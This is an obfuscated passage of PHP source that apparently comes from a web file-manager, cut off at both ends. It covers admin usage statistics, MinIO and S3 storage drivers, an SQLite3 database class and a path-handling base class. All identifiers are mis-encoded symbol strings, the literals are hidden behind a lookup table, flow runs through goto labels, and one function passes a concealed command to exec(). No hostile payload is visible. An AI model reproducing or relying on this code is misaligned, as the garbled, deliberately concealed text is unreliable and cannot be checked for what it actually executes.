$≈È≤Úﬁ¢[1764]: $–‘±÷„ = 1; do { $Ö˝…Û· = date($≈È≤Úﬁ¢[1943], strtotime("\x2d\x20{$–‘±÷„}\40\x6d\x6f\x6e\x74\x68\163")); $ë»Ï›øø[] = $Ö˝…Û·; $–‘±÷„++; } while ($ﬂÒÃ˚≥ƒ < $Ö˝…Û·); break; case $≈È≤Úﬁ¢[1944]: $Ï≠—∫≠º = (int) date($≈È≤Úﬁ¢[1942], strtotime($ﬂÒÃ˚≥ƒ)); $ãÊîÍˆ˜ = (int) date($≈È≤Úﬁ¢[1942]); if ($Ï≠—∫≠º >= $ãÊîÍˆ˜) { break; } for ($Ï≠—∫≠º; $Ï≠—∫≠º < $ãÊîÍˆ˜; $Ï≠—∫≠º++) { $ë»Ï›øø[] = $Ï≠—∫≠º . $≈È≤Úﬁ¢[1945]; } break; default: break; } if ($ﬂÒÃ˚≥ƒ > end($ë»Ï›øø)) { array_pop($ë»Ï›øø); } sort($ë»Ï›øø); return $ë»Ï›øø; } public function listTable($´øèŒèË) { $˚áÔ˙ÚÄ = ucfirst($´øèŒèË); return Model($˚áÔ˙ÚÄ)->listData(); } public function option($üñçîÑù) { $∞‡ªÄ€¥ = $_SERVER[ˆë€Ï⁄∂][1946] . ucfirst($üñçîÑù); return $this->{$∞‡ªÄ€¥}(); } private function optionUser() { $ç≠ﬁÃíÕ =& $_SERVER[ˆë€Ï⁄∂]; $±˙Óä≥œ = Model($ç≠ﬁÃíÕ[608])->count($ç≠ﬁÃíÕ[1787]); $·£Ω¥Ú˜ = Model($ç≠ﬁÃíÕ[608])->where($ç≠ﬁÃíÕ[1947])->count($ç≠ﬁÃíÕ[1787]); $ææÒËÉ– = intval($GLOBALS[$ç≠ﬁÃíÕ[6]][$ç≠ﬁÃíÕ[435]][$ç≠ﬁÃíÕ[1732]]) / 3600; $ƒÚØï®¡ = strtotime("\x2d{$ææÒËÉ–}\x20\x68\157\x75\162\x73"); $Èô¿ù“Ü = strtotime(date($ç≠ﬁÃíÕ[1928])); if ($ƒÚØï®¡ < $Èô¿ù“Ü) { $ƒÚØï®¡ = $Èô¿ù“Ü; } $ãÚ∏´ê¢ = array($ç≠ﬁÃíÕ[1948] => array($ç≠ﬁÃíÕ[1106], $ƒÚØï®¡)); $õÃ„Öí¶ = (int) Model($ç≠ﬁÃíÕ[608])->where($ãÚ∏´ê¢)->count($ç≠ﬁÃíÕ[1787]); if (!$õÃ„Öí¶) { $õÃ„Öí¶ = 1; } $ãÚ∏´ê¢ = array($ç≠ﬁÃíÕ[1948] => array($ç≠ﬁÃíÕ[1106], $Èô¿ù“Ü)); $∞ıÏ£ú• = Model($ç≠ﬁÃíÕ[608])->where($ãÚ∏´ê¢)->count($ç≠ﬁÃíÕ[1787]); return array($ç≠ﬁÃíÕ[849] => (int) $±˙Óä≥œ, $ç≠ﬁÃíÕ[1949] => (int) ($±˙Óä≥œ - $·£Ω¥Ú˜), $ç≠ﬁÃíÕ[1950] => (int) $·£Ω¥Ú˜, $ç≠ﬁÃíÕ[1951] => (int) $∞ıÏ£ú•, $ç≠ﬁÃíÕ[1952] => $õÃ„Öí¶); } private function optionFile() { $±£åûÏì =& $_SERVER[ˆë€Ï⁄∂]; $Éú»ôú‚ = $this->sourceSize(); $„÷Œï¨¬ = $Éú»ôú‚[$±£åûÏì[89]]; $ﬂ’¨»¥Ë = $Éú»ôú‚[$±£åûÏì[1921]]; $’™»≠Ù◊ = Model($±£åûÏì[916])->where(array($±£åûÏì[496] => 0))->count($±£åûÏì[203]); $›Ï±Œ—¯ = array($±£åûÏì[496] => 0, $±£åûÏì[243] => array($±£åûÏì[1106], strtotime(date($±£åûÏì[1928])))); $Ñóéø¯Ö = Model($±£åûÏì[916])->where($›Ï±Œ—¯)->sum($±£åûÏì[89]); $÷ﬁñ¯•¸ = Model($±£åûÏì[916])->where($›Ï±Œ—¯)->count($±£åûÏì[203]); return array($±£åûÏì[854] => $„÷Œï¨¬, $±£åûÏì[1921] => $ﬂ’¨»¥Ë, $±£åûÏì[1953] => $„÷Œï¨¬ - $ﬂ’¨»¥Ë, $±£åûÏì[1954] => (int) $Ñóéø¯Ö, $±£åûÏì[856] => (int) $’™»≠Ù◊, $±£åûÏì[1955] => (int) $÷ﬁñ¯•¸); } private function optionAccess() { $àƒ™Æ¡Ñ =& $_SERVER[ˆë€Ï⁄∂]; return array($àƒ™Æ¡Ñ[849] => $this->typeLogCnt(), $àƒ™Æ¡Ñ[120] => $this->typeLogCnt($àƒ™Æ¡Ñ[120]), $àƒ™Æ¡Ñ[536] => $this->typeLogCnt($àƒ™Æ¡Ñ[536]), $àƒ™Æ¡Ñ[1956] => $this->typeLogCnt($àƒ™Æ¡Ñ[1956]), $àƒ™Æ¡Ñ[1957] => $this->typeLogCnt($àƒ™Æ¡Ñ[1957]), $àƒ™Æ¡Ñ[676] => $this->typeLogCnt($àƒ™Æ¡Ñ[12], $àƒ™Æ¡Ñ[1932])); } private function typeLogCnt($§ÉÄÈÈµ = '', $≠≤∞„º∞ = "\x69\x64") { $÷¶¯¶óÕ =& $_SERVER[ˆë€Ï⁄∂]; $∑ŒøÓÊ = array($÷¶¯¶óÕ[120] => array($÷¶¯¶óÕ[1958], $÷¶¯¶óÕ[1959]), $÷¶¯¶óÕ[536] => array($÷¶¯¶óÕ[1960], $÷¶¯¶óÕ[1961]), $÷¶¯¶óÕ[1956] => array($÷¶¯¶óÕ[1962], $÷¶¯¶óÕ[1963], $÷¶¯¶óÕ[1964]), $÷¶¯¶óÕ[1957] => array($÷¶¯¶óÕ[1965], $÷¶¯¶óÕ[1966]), $÷¶¯¶óÕ[1967] => array($÷¶¯¶óÕ[1968], $÷¶¯¶óÕ[1969], $÷¶¯¶óÕ[1970])); $›“ﬁöî  = strtotime(date($÷¶¯¶óÕ[1928])); $Í±ßê»± = array($÷¶¯¶óÕ[243] => array($÷¶¯¶óÕ[1106], $›“ﬁöî )); if ($§ÉÄÈÈµ) { $Í±ßê»±[$÷¶¯¶óÕ[33]] = array($÷¶¯¶óÕ[7], $∑ŒøÓÊ[$§ÉÄÈÈµ]); } $Ü¢ÎÒÀ“ = Model($÷¶¯¶óÕ[1931])->where($Í±ßê»±)->count($≠≤∞„º∞); return (int) $Ü¢ÎÒÀ“; } private function optionServer() { $ì´’„Óπ =& $_SERVER[ˆë€Ï⁄∂]; $˚Ê¬™ªÆ = $this->diskDriver(); $ÓãØ„‡¢ = KodIO::defaultDriver(); $ŸÓ¡Ëãò = array($ì´’„Óπ[909] => $ÓãØ„‡¢[$ì´’„Óπ[486]]); $ÛîÁÛ£ó = Model($ì´’„Óπ[555])->where($ŸÓ¡Ëãò)->sum($ì´’„Óπ[89]); $ˆÍÕ¨“õ = explode($ì´’„Óπ[53], $_SERVER[$ì´’„Óπ[157]]); $≥∏˛≤°ì = $ˆÍÕ¨“õ[0]; $á©’™˜Ç = $GLOBALS[$ì´’„Óπ[6]][$ì´’„Óπ[21]]; $≈çæºÒ‘ = $á©’™˜Ç[$ì´’„Óπ[1068]]; if ($≈çæºÒ‘ == $ì´’„Óπ[1056]) { $ôì…ø±é = explode($ì´’„Óπ[1383], $á©’™˜Ç[$ì´’„Óπ[1067]]); $≈çæºÒ‘ = $ôì…ø±é[0]; } if ($≈çæºÒ‘ == $ì´’„Óπ[1004] || $≈çæºÒ‘ == $ì´’„Óπ[896]) { $ñÂÓ¡⁄Ÿ = Model()->db()->query($ì´’„Óπ[1971]); $è¯Â›¶ø = $ñÂÓ¡⁄Ÿ[0] && isset($ñÂÓ¡⁄Ÿ[0][$ì´’„Óπ[1674]]) ? $ñÂÓ¡⁄Ÿ[0][$ì´’„Óπ[1674]] : 0; $≈çæºÒ‘ = $ì´’„Óπ[1972] . ($è¯Â›¶ø ? $ì´’„Óπ[8] . $è¯Â›¶ø : $ì´’„Óπ[12]); } $Ô’ä∆ôä = $GLOBALS[$ì´’„Óπ[6]][$ì´’„Óπ[435]][$ì´’„Óπ[918]]; return array($ì´’„Óπ[1973] => $˚Ê¬™ªÆ ? $˚Ê¬™ªÆ[$ì´’„Óπ[1974]] : 0, $ì´’„Óπ[1975] => $˚Ê¬™ªÆ ? $˚Ê¬™ªÆ[$ì´’„Óπ[1976]] : 0, $ì´’„Óπ[1977] => (int) $ÓãØ„‡¢[$ì´’„Óπ[1974]] * 1024 * 1024 * 1024, $ì´’„Óπ[1978] => (int) $ÛîÁÛ£ó, $ì´’„Óπ[1979] => ucfirst($≥∏˛≤°ì), $ì´’„Óπ[1980] => $ì´’„Óπ[1981] . PHP_VERSION, $ì´’„Óπ[1982] => phpBuild64() ? 64 : 32, $ì´’„Óπ[848] => str_replace($ì´’„Óπ[1224], $ì´’„Óπ[1084], $≈çæºÒ‘), $ì´’„Óπ[435] => ucfirst($Ô’ä∆ôä), $ì´’„Óπ[32] => $_SERVER[$ì´’„Óπ[1983]]); } private function diskDriver() { $‘ôÛ˝ê˙ =& $_SERVER[ˆë€Ï⁄∂]; $“ŒÍı§í = $‘ôÛ˝ê˙[8]; $˝á˘Ú≠Ï = $GLOBALS[$‘ôÛ˝ê˙[6]][$‘ôÛ˝ê˙[1400]] == $‘ôÛ˝ê˙[1401]; if ($˝á˘Ú≠Ï) { $“ŒÍı§í = $‘ôÛ˝ê˙[1984]; if (function_exists($‘ôÛ˝ê˙[1985])) { exec($‘ôÛ˝ê˙[1986], $ÆÇ©„úè); $“ŒÍı§í = $ÆÇ©„úè[1] . $‘ôÛ˝ê˙[8]; } } if (!file_exists($“ŒÍı§í)) { return; } if (!function_exists($‘ôÛ˝ê˙[1987])) { return; } $øñ¿£—¨ = @disk_total_space($“ŒÍı§í); $≈Ú¸¬Œﬁ = $øñ¿£—¨ - @disk_free_space($“ŒÍı§í); return array($‘ôÛ˝ê˙[1974] => $øñ¿£—¨, $‘ôÛ˝ê˙[1976] => $≈Ú¸¬Œﬁ); } public function fileChart($Ωﬁ¡è—∫) { $ô£äâ™ê =& $_SERVER[ˆë€Ï⁄∂]; if (isset($Ωﬁ¡è—∫[$ô£äâ™ê[1787]])) { return Model($ô£äâ™ê[916])->userFileTypeProfile($Ωﬁ¡è—∫[$ô£äâ™ê[1787]]); } if (isset($Ωﬁ¡è—∫[$ô£äâ™ê[1988]])) { return Model($ô£äâ™ê[916])->groupFileTypeProfile($Ωﬁ¡è—∫[$ô£äâ™ê[1988]]); } $î®Í∆Œ¡ = $this->sourceSize(); $Ç¥®Æ≤Ò = array($ô£äâ™ê[202] => 0, $ô£äâ™ê[200] => 1); $¿»ˆêôè = Model($ô£äâ™ê[916])->where($Ç¥®Æ≤Ò)->sum($ô£äâ™ê[89]); $Ç¥®Æ≤Ò[$ô£äâ™ê[200]] = 2; $≥‘ÈÊ˝≥ = Model($ô£äâ™ê[916])->where($Ç¥®Æ≤Ò)->sum($ô£äâ™ê[89]); return array($ô£äâ™ê[854] => $î®Í∆Œ¡[$ô£äâ™ê[89]], $ô£äâ™ê[1921] => $î®Í∆Œ¡[$ô£äâ™ê[1921]], $ô£äâ™ê[1922] => (int) $¿»ˆêôè, $ô£äâ™ê[1923] => (int) $≥‘ÈÊ˝≥); } private function sourceSize() { $Ç‘∑õîØ =& $_SERVER[ˆë€Ï⁄∂]; $©é≠üÑÜ = Model($Ç‘∑õîØ[916])->where(array($Ç‘∑õîØ[496] => 0))->sum($Ç‘∑õîØ[89]); $¢∑∑ƒ©œ = Model($Ç‘∑õîØ[555])->sum($Ç‘∑õîØ[89]); if ($¢∑∑ƒ©œ > $©é≠üÑÜ) { $¢∑∑ƒ©œ = $©é≠üÑÜ; } return array($Ç‘∑õîØ[89] => (int) $©é≠üÑÜ, $Ç‘∑õîØ[1921] => (int) $¢∑∑ƒ©œ); } } goto aŒæıë¢‹†; D»æ¨±é´á: class PathDriverMinIO extends PathDriverBaseS3 { public function __construct($ßÛî’°Í) { $¯√ª≤˘Ñ =& $_SERVER[ˆë€Ï⁄∂]; parent::__construct($ßÛî’°Í); $this->setSignVersion($¯√ª≤˘Ñ[259]); if (!$this->region) { $this->region = $¯√ª≤˘Ñ[316]; $this->client->setRegion($this->region); } $this->client->setHeadValid(!1); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function checkRegion() { $±ø–ÿ∆Ä = $this->getBktRegion(); return $this->region == $±ø–ÿ∆Ä ? !0 : !1; } public function uploadFormData($ ≠‚Ó›™, $◊˜∫Ôúò = 3600) { $ÿÇ«ø⁄≠ =& $_SERVER[ˆë€Ï⁄∂]; $—“Öß‡‚ = $ÿÇ«ø⁄≠[241]; $†ëô…µ√ = $ÿÇ«ø⁄≠[269]; $•—ó€≥˘ = $ÿÇ«ø⁄≠[72]; $¯∆¬•Áæ = gmdate($ÿÇ«ø⁄≠[270]); $¬⁄√”º¥ = gmdate($ÿÇ«ø⁄≠[271]); $âﬂ∑ˆÍÙ = $ÿÇ«ø⁄≠[272]; $ßëÿ¶‚Ò = $◊˜∫Ôúò . $ÿÇ«ø⁄≠[12]; $õ®ﬂíœ¿ = $ÿÇ«ø⁄≠[273]; $¶îôÂà± = array($this->accessKey, $¬⁄√”º¥, $this->region, $•—ó€≥˘, $âﬂ∑ˆÍÙ); $ÀÖŸÍ–– = implode($ÿÇ«ø⁄≠[8], $¶îôÂà±); $ŸÅ∞Êß“ = array($ÿÇ«ø⁄≠[274] => gmdate($ÿÇ«ø⁄≠[275], strtotime($ÿÇ«ø⁄≠[276])), $ÿÇ«ø⁄≠[277] => array(array($ÿÇ«ø⁄≠[278] => $this->bucket), array($ÿÇ«ø⁄≠[317] => $—“Öß‡‚), array($ÿÇ«ø⁄≠[279], $ÿÇ«ø⁄≠[280], $ÿÇ«ø⁄≠[12]), array($ÿÇ«ø⁄≠[279], $ÿÇ«ø⁄≠[281], $ÿÇ«ø⁄≠[12]), array($ÿÇ«ø⁄≠[279], $ÿÇ«ø⁄≠[318], $ÿÇ«ø⁄≠[12]), array($ÿÇ«ø⁄≠[282] => $õ®ﬂíœ¿), array($ÿÇ«ø⁄≠[283] => $ÀÖŸÍ––), array($ÿÇ«ø⁄≠[284] => $†ëô…µ√), array($ÿÇ«ø⁄≠[285] => $¯∆¬•Áæ), array($ÿÇ«ø⁄≠[286] => $ßëÿ¶‚Ò))); $ôåóÒÛÄ = base64_encode(json_encode($ŸÅ∞Êß“)); $Ö©Ÿá⁄µ = hash_hmac($ÿÇ«ø⁄≠[287], $¬⁄√”º¥, $ÿÇ«ø⁄≠[288] . $this->secret, !0); $êƒèûÆ¶ = hash_hmac($ÿÇ«ø⁄≠[287], $this->region, $Ö©Ÿá⁄µ, !0); $’ßÚª˝ø = hash_hmac($ÿÇ«ø⁄≠[287], $•—ó€≥˘, $êƒèûÆ¶, !0); $≠¡Òù†Ô = hash_hmac($ÿÇ«ø⁄≠[287], $âﬂ∑ˆÍÙ, $’ßÚª˝ø, !0); $ä™¢Å∆â = hash_hmac($ÿÇ«ø⁄≠[287], $ôåóÒÛÄ, $≠¡Òù†Ô); $Ã©Ø¨ßÕ = array($ÿÇ«ø⁄≠[258] => $ÿÇ«ø⁄≠[12], $ÿÇ«ø⁄≠[305] => $ÿÇ«ø⁄≠[12], $ÿÇ«ø⁄≠[317] => $—“Öß‡‚, $ÿÇ«ø⁄≠[282] => $õ®ﬂíœ¿, $ÿÇ«ø⁄≠[289] => $ôåóÒÛÄ, $ÿÇ«ø⁄≠[319] => $ÀÖŸÍ––, $ÿÇ«ø⁄≠[320] => $†ëô…µ√, $ÿÇ«ø⁄≠[321] => $¯∆¬•Áæ, $ÿÇ«ø⁄≠[322] => $ßëÿ¶‚Ò, $ÿÇ«ø⁄≠[323] => $ä™¢Å∆â, $ÿÇ«ø⁄≠[218] => $this->getHost()); return $Ã©Ø¨ßÕ; } } class PathDriverS3 extends PathDriverBaseS3 { public function __construct($‰•¡èıÙ) { $åÅπ·©ö =& $_SERVER[ˆë€Ï⁄∂]; parent::__construct($‰•¡èıÙ); $√¡’ÃÈı = isset($‰•¡èıÙ[$åÅπ·©ö[268]]) && $‰•¡èıÙ[$åÅπ·©ö[268]] == $åÅπ·©ö[259] ? $åÅπ·©ö[259] : $åÅπ·©ö[324]; $this->setSignVersion($√¡’ÃÈı); } public function link($ôïöÃÖ…, $¢ÿ¯Ø…ﬂ = array()) { return parent::link($ôïöÃÖ…, $¢ÿ¯Ø…ﬂ); } public function fileOut($ƒ∞¥Ã⁄¶, $Û‰ﬁµûﬂ = false, $˛îÜÃà¿ = false, $˜€çŸﬂ˘ = '') { if ($this->isFileOutServer() || strstr($this->endpoint, $_SERVER[ˆë€Ï⁄∂][325])) { return parent::fileOutServer($ƒ∞¥Ã⁄¶, $Û‰ﬁµûﬂ, $˛îÜÃà¿, $˜€çŸﬂ˘); } parent::fileOut($ƒ∞¥Ã⁄¶, $Û‰ﬁµûﬂ, $˛îÜÃà¿, $˜€çŸﬂ˘); } public function fileOutImage($”∞›‹•¯, $Í‰’ØÏ≤ = 250) { if (strstr($this->endpoint, $_SERVER[ˆë€Ï⁄∂][325])) { return parent::fileOutImageServer($”∞›‹•¯, $Í‰’ØÏ≤); } parent::fileOutImage($”∞›‹•¯, $Í‰’ØÏ≤); } public function fileOutLink($‰ÇëÍ≥À) { $‡∞·œŸÑ =& $_SERVER[ˆë€Ï⁄∂]; if (substr($‰ÇëÍ≥À, 0, 7) == $‡∞·œŸÑ[228]) { $‰ÇëÍ≥À = $‡∞·œŸÑ[229] . substr($‰ÇëÍ≥À, 7); } header($‡∞·œŸÑ[185] . $‰ÇëÍ≥À); die; } } define($_SERVER[ˆë€Ï⁄∂][326], 1); goto F´—ÖıÑ£Ÿ; bº≈¨·á∞‰: class DbSqlite3Base extends Db { public function __construct($íﬂ«ÎÖ÷ = '') { $Å“Æ¬†ﬂ =& $_SERVER[ˆë€Ï⁄∂]; if (!class_exists($Å“Æ¬†ﬂ[64])) { think_exception(think_lang($Å“Æ¬†ﬂ[14]) . $Å“Æ¬†ﬂ[65]); } if (!empty($íﬂ«ÎÖ÷)) { if (!isset($íﬂ«ÎÖ÷[$Å“Æ¬†ﬂ[16]])) { $íﬂ«ÎÖ÷[$Å“Æ¬†ﬂ[16]] = 438; } $this->config = $íﬂ«ÎÖ÷; if (empty($this->config[$Å“Æ¬†ﬂ[17]])) { $this->config[$Å“Æ¬†ﬂ[17]] = array(); } } } public function connect($≠·íë‚† = '', $Íƒ√˛«¢ = 0) { $√˚ñ‚ÊÛ =& $_SERVER[ˆë€Ï⁄∂]; if (!isset($this->linkID[$Íƒ√˛«¢])) { if (empty($≠·íë‚†)) { $≠·íë‚† = $this->config; } $this->linkID[$Íƒ√˛«¢] = new SQLite3($≠·íë‚†[$√˚ñ‚ÊÛ[21]]); if (!$this->linkID[$Íƒ√˛«¢]) { think_exception($this->linkID[$Íƒ√˛«¢]->lastErrorMsg()); } $this->connected = !0; @$this->linkID[$Íƒ√˛«¢]->busyTimeout(30000); if (1 != think_config($√˚ñ‚ÊÛ[22])) { unset($this->config); } } return $this->linkID[$Íƒ√˛«¢]; } public function free() { $this->queryID = null; } public function query($á◊Ì‹´≥) { $•ﬁôµ£’ =& $_SERVER[ˆë€Ï⁄∂]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $á◊Ì‹´≥; if ($this->queryID) { $this->free(); } think_action_status($•ﬁôµ£’[23], 1); think_status($•ﬁôµ£’[24]); $this->queryID = $this->_linkID->query($á◊Ì‹´≥); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $ÔËá£∑Â = $this->getAll(); $this->numRows = count($ÔËá£∑Â); return $ÔËá£∑Â; } } public function execute($Ï∞÷¶˚Ÿ) { $¸¢ˆƒ∂¶ =& $_SERVER[ˆë€Ï⁄∂]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $Ï∞÷¶˚Ÿ; if ($this->queryID) { $this->free(); } think_action_status($¸¢ˆƒ∂¶[25], 1); think_status($¸¢ˆƒ∂¶[24]); $Ïì‘ÜŒ’ = $this->_linkID->exec($Ï∞÷¶˚Ÿ); $this->debug(); if (!1 === $Ïì‘ÜŒ’) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->changes(); $this->lastInsID = $this->_linkID->lastInsertRowID(); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->query($_SERVER[ˆë€Ï⁄∂][26]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $ÉÈı∞Ü≥ = $this->_linkID->query($_SERVER[ˆë€Ï⁄∂][27]); if (!$ÉÈı∞Ü≥) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $˘∂Ê¥ú’ = $this->_linkID->query($_SERVER[ˆë€Ï⁄∂][28]); if (!$˘∂Ê¥ú’) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $ø≈ı≤≈ù = array(); while ($ºÒ‹À¯˙ = $this->queryID->fetchArray(SQLITE3_ASSOC)) { $ø≈ı≤≈ù[] = $ºÒ‹À¯˙; } $this->queryID->reset(); return $ø≈ı≤≈ù; } public function getFields($†Ô”¸ñı) { $÷⁄å·˝Ã =& $_SERVER[ˆë€Ï⁄∂]; $¥¨◊ÄËΩ = $this->query($÷⁄å·˝Ã[29] . $†Ô”¸ñı . $÷⁄å·˝Ã[30]); $âô–ìë≈ = array(); if ($¥¨◊ÄËΩ) { foreach ($¥¨◊ÄËΩ as $¯é„≈ﬂè => $Û’ã ƒ‡) { $âô–ìë≈[$Û’ã ƒ‡[$÷⁄å·˝Ã[32]]] = array($÷⁄å·˝Ã[32] => $Û’ã ƒ‡[$÷⁄å·˝Ã[32]], $÷⁄å·˝Ã[33] => $Û’ã ƒ‡[$÷⁄å·˝Ã[33]], $÷⁄å·˝Ã[35] => (bool) ($Û’ã ƒ‡[$÷⁄å·˝Ã[35]] === $÷⁄å·˝Ã[12]), $÷⁄å·˝Ã[37] => $Û’ã ƒ‡[$÷⁄å·˝Ã[66]], $÷⁄å·˝Ã[39] => (bool) $Û’ã ƒ‡[$÷⁄å·˝Ã[67]], $÷⁄å·˝Ã[42] => (bool) $Û’ã ƒ‡[$÷⁄å·˝Ã[67]]); } } return $âô–ìë≈; } public function getTables($“È¿ÅŒ¸ = '') { $æ∆˚û•¬ =& $_SERVER[ˆë€Ï⁄∂]; $†ö∏®“≠ = $this->query($æ∆˚û•¬[45] . $æ∆˚û•¬[46] . $æ∆˚û•¬[47]); $ê»Î¢Õ® = array(); foreach ($†ö∏®“≠ as $‡Ÿáæó√ => $ÅïΩ∫œ”) { $ê»Î¢Õ®[$‡Ÿáæó√] = current($ÅïΩ∫œ”); } return $ê»Î¢Õ®; } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $Ä„—üº£ =& $_SERVER[ˆë€Ï⁄∂]; $this->error = $this->_linkID->lastErrorMsg(); if ($Ä„—üº£[12] != $this->queryStr) { $this->error .= LNG($Ä„—üº£[48]) . $this->queryStr; } think_trace($this->error, $Ä„—üº£[12], $Ä„—üº£[49]); return $this->error; } public function escapeString($‚Ø”ÃÒÅ) { $™Ûâ®Ì¬ =& $_SERVER[ˆë€Ï⁄∂]; if ($this->_linkID) { return $this->_linkID->escapeString($‚Ø”ÃÒÅ); } return str_ireplace($™Ûâ®Ì¬[68], $™Ûâ®Ì¬[69], $‚Ø”ÃÒÅ); } public function parseLimit($Û‰ì’àò) { $º∞»ÿ˛÷ =& $_SERVER[ˆë€Ï⁄∂]; $˚≈æıèô = $º∞»ÿ˛÷[12]; if (!empty($Û‰ì’àò)) { $Û‰ì’àò = explode($º∞»ÿ˛÷[50], $Û‰ì’àò); if (count($Û‰ì’àò) > 1) { $˚≈æıèô .= $º∞»ÿ˛÷[51] . $Û‰ì’àò[1] . $º∞»ÿ˛÷[52] . $Û‰ì’àò[0] . $º∞»ÿ˛÷[53]; } else { $˚≈æıèô .= $º∞»ÿ˛÷[51] . $Û‰ì’àò[0] . $º∞»ÿ˛÷[53]; } } return $˚≈æıèô; } } class PathDriverBase { public $pathDriver = ''; public $pathBase = ''; public $path = ''; public $pathID = ''; public $_data = array(); public function __construct() { $÷¿—•Ø≤ =& $_SERVER[ˆë€Ï⁄∂]; $this->objectDriver = array($÷¿—•Ø≤[70], $÷¿—•Ø≤[71], $÷¿—•Ø≤[72], $÷¿—•Ø≤[73], $÷¿—•Ø≤[74], $÷¿—•Ø≤[75], $÷¿—•Ø≤[76], $÷¿—•Ø≤[77], $÷¿—•Ø≤[78], $÷¿—•Ø≤[79], $÷¿—•Ø≤[80], $÷¿—•Ø≤[81]); $this->_classObjectID = mt_rand(0, 10000); } public function getPath($”ºã»·À) { if (in_array($this->getType(), $this->objectDriver)) { return ltrim($”ºã»·À, $_SERVER[ˆë€Ï⁄∂][8]); } return $”ºã»·À; } public function iconvApp($Õ∑≈ı–É) { return $Õ∑≈ı–É; } public function iconvSystem($¯ÿÌ‡‡∆) { return $¯ÿÌ‡‡∆; } public function iconvTo($”µºº“ú, $ﬁÃ¡‚µ‘, $Ô€¡œÀô) { $¿Ÿõ‚√ö =& $_SERVER[ˆë€Ï⁄∂]; if (!$”µºº“ú || !function_exists($¿Ÿõ‚√ö[82])) { return $”µºº“ú; } static $…∑ú»ÅÇ = array(); $ë≠åƒöé = $ﬁÃ¡‚µ‘ . $¿Ÿõ‚√ö[83] . $Ô€¡œÀô . $¿Ÿõ‚√ö[84] . $”µºº“ú; if (isset($…∑ú»ÅÇ[$ë≠åƒöé])) { return $…∑ú»ÅÇ[$ë≠åƒöé]; } if (function_exists($¿Ÿõ‚√ö[85])) { $Ω™úπ©˙ = @mb_convert_encoding($”µºº“ú, $Ô€¡œÀô, $ﬁÃ¡‚µ‘); } else { $Ω™úπ©˙ = @iconv($ﬁÃ¡‚µ‘, $Ô€¡œÀô, $”µºº“ú); } $Ω™úπ©˙ = $Ω™úπ©˙ ? $Ω™úπ©˙ : $”µºº“ú; if (strstr($Ω™úπ©˙, $¿Ÿõ‚√ö[86])) { $Ω™úπ©˙ = str_replace($¿Ÿõ‚√ö[86], $¿Ÿõ‚√ö[11], $Ω™úπ©˙); } $…∑ú»ÅÇ[$ﬁÃ¡‚µ‘ . $¿Ÿõ‚√ö[83] . $Ô€¡œÀô . $¿Ÿõ‚√ö[84] . $”µºº“ú] = $Ω™úπ©˙; $…∑ú»ÅÇ[$Ô€¡œÀô . $¿Ÿõ‚√ö[83] . $ﬁÃ¡‚µ‘ . $¿Ÿõ‚√ö[84] . $”µºº“ú] = $”µºº“ú; $…∑ú»ÅÇ[$Ô€¡œÀô . $¿Ÿõ‚√ö[83] . $ﬁÃ¡‚µ‘ . $¿Ÿõ‚√ö[84] . $Ω™úπ©˙] = $”µºº“ú; $…∑ú»ÅÇ[$ﬁÃ¡‚µ‘ . $¿Ÿõ‚√ö[83] . $Ô€¡œÀô . $¿Ÿõ‚√ö[84] . $Ω™úπ©˙] = $Ω™úπ©˙; return $Ω™úπ©˙; } public function getPathInner($ÓèÚ˙∏¶) { $ÇÓöø = IO::init($ÓèÚ˙∏¶); return $ÇÓöø->path; } public function getPathOuter($ê–≥∫ï∑) { $ñí –ôá =& $_SERVER[ˆë€Ï⁄∂]; $ÇõÎóñØ = strlen(trim($this->pathBase, $ñí –ôá[8])); $ê–≥∫ï∑ = substr(trim($ê–≥∫ï∑, $ñí –ôá[8]), $ÇõÎóñØ); return $this->pathDriver . $ñí –ôá[8] . ltrim($ê–≥∫ï∑, $ñí –ôá[8]); } public function isParentOf($æÊ®ÎÊ, $Ù◊•ÛÖ´) { $Ø‡Ì∑€¸ =& $_SERVER[ˆë€Ï⁄∂]; $æÊ®ÎÊ = rtrim(strtolower($æÊ®ÎÊ), $Ø‡Ì∑€¸[8]) . $Ø‡Ì∑€¸[8]; $Ù◊•ÛÖ´ = rtrim(strtolower($Ù◊•ÛÖ´), $Ø‡Ì∑€¸[8]) . $Ø‡Ì∑€¸[8]; $™Á¢œñ˚ = strpos($Ù◊•ÛÖ´, $æÊ®ÎÊ) === 0; return $™Á¢œñ˚; } public function getType() { $·≥Ï÷ª— =& $_SERVER[ˆë€Ï⁄∂]; $Ü„ß·çÑ = str_replace($·≥Ï÷ª—[87], $·≥Ï÷ª—[12], get_class($this)); return strtolower($Ü„ß·çÑ); } public function isOsDriver() { if (!is_array($this->objectDriver)) { return !1; } return in_array($this->getType(), $this->objectDriver); } public function fileNameExist($ó¨¢°¿¨, $ÿ’µÇßÚ) { $ÙÀÄ™–ÿ =& $_SERVER[ˆë€Ï⁄∂]; $∫÷˜ıÚ¢ = rtrim($ó¨¢°¿¨, $ÙÀÄ™–ÿ[8]) . $ÙÀÄ™–ÿ[8] . $ÿ’µÇßÚ; $¥ôºÎ˚£ = $this->exist($∫÷˜ıÚ¢); return $¥ôºÎ˚£ ? $∫÷˜ıÚ¢ : !1; } public function setModifyTime($ŒÄ∫¨£“, $“ÿéÕ¯ù = '') { } public function renameObject($¨≠é›ÄÍ, $¶Ï’°à±) { $Â¸–Ó¿ë = $¶Ï’°à±; $¨≠é›ÄÍ = $this->getPathOuter($¨≠é›ÄÍ); $¶Ï’°à± = $this->pathFather($¨≠é›ÄÍ) . $¶Ï’°à±; $Í‘Î…ÏÇ = IO::copy($¨≠é›ÄÍ, $this->pathFather($¨≠é›ÄÍ), REPEAT_RENAME_FOLDER, $Â¸–Ó¿ë); if ($Í‘Î…ÏÇ) { IO::remove($¨≠é›ÄÍ); } return $Í‘Î…ÏÇ ? $¶Ï’°à± : !1; } public function tempFile($ÂÚ∑®™ª = '', $–ﬂ¨∆Ú¨ = 